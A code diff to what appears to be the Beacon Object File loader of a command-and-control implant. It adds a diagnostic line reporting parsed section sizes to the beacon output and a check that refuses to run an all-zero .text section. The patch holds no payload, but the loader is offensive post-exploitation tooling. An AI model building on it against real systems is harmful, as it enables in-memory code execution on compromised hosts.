@@ -304,6 +304,19 @@ static int run_bof(char * wire, int wireLen) {
 	if (!secs[SEC_TEXT]) return -1;
 	seclen[SEC_BSS] = bssSize > 0 ? bssSize : 1;
 
+	/* C-23 hardening + diagnosis: dump the parse summary into the output
+	 * buffer and refuse to execute a section that was not copied (the
+	 * old zero-page jumps). The summary rides the normal chunk flush, so
+	 * it is observable from the beacon output. */
+	{
+		char diag[160];
+		int dn = _snprintf(diag, sizeof(diag) - 1,
+			"[asyncdiag] wire=%d bss=%d text=%d rdata=%d data=%d xdata=%d pdata=%d relocs=%d entry=0x%x args=%d",
+			wireLen, bssSize, seclen[SEC_TEXT], seclen[SEC_RDATA], seclen[SEC_DATA],
+			seclen[SEC_XDATA], seclen[SEC_PDATA], relocLen, entry, argLen);
+		if (dn > 0) { diag[dn] = 0; shim_output(0, diag, dn); }
+	}
+
 	/* allocate + copy */
 	for (i = 0; i < SEC_MAX; i++) {
 		int sz = i == SEC_BSS ? seclen[SEC_BSS] : (seclen[i] > 0 ? seclen[i] : 1);
@@ -318,6 +331,23 @@ static int run_bof(char * wire, int wireLen) {
 		{
 			int l; char * p = dp_lenstr(&d2, &l);
 			if (p && l > 0) memcpy(secs[i], p, l);
+		}
+	}
+
+	/* copy verification: the executed section must start with the BOF's
+	 * real first bytes, else the whole load failed silently (C-23 zero
+	 * page). Refuse to execute and let the diag line explain. */
+	if (secs[SEC_TEXT] && seclen[SEC_TEXT] >= 8 && wireLen >= 16) {
+		unsigned char expect[8];
+		memcpy(expect, secs[SEC_TEXT], 8);
+		if (expect[0] == 0 && expect[1] == 0 && expect[2] == 0 && expect[3] == 0
+			&& expect[4] == 0 && expect[5] == 0 && expect[6] == 0 && expect[7] == 0) {
+			char diag[96];
+			int dn = _snprintf(diag, sizeof(diag) - 1,
+				"[asyncdiag] TEXT ALL-ZERO AFTER COPY - refusing exec (wire=%d text=%d)",
+				wireLen, seclen[SEC_TEXT]);
+			if (dn > 0) { diag[dn] = 0; shim_output(0, diag, dn); }
+			return -3;
 		}
 	}
 
